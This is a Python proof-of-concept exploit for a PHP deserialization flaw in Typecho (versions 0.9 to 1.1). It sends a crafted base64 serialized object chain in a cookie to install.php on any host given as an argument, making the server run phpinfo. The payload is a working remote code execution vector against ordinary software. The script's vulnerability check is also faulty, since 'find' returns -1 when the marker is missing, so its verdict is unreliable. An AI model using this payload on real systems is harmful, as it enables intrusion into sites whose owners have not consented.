#!/usr/bin/python

import sys
import requests
from requests.api import request


def poc(host):
    url = 'http://'+host+'/install.php?finish=1'
    print('Testing url:'+url)
    header = {
        'Cookie': '__typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9',
        'Referer': 'http://'+host+'/install.php'
    }
    try:
        r = requests.get(url, headers=header, timeout=10)
    except requests.exceptions.ConnectTimeout:
        print('Can\'t connect to the host')
        return False
    response = r.content.decode('utf-8')
    if response.find('phpinfo()'):
        print('The host is vulnerable to php_serialize_exploit (0.9 < typecho version < 1.1) !')
        return True
    else:
        print('The host is not vulnerable to php_serialize_exploit (0.9 < typecho version < 1.1) !')
        return False


if __name__ == '__main__':
    host = sys.argv[1]
    poc(host)


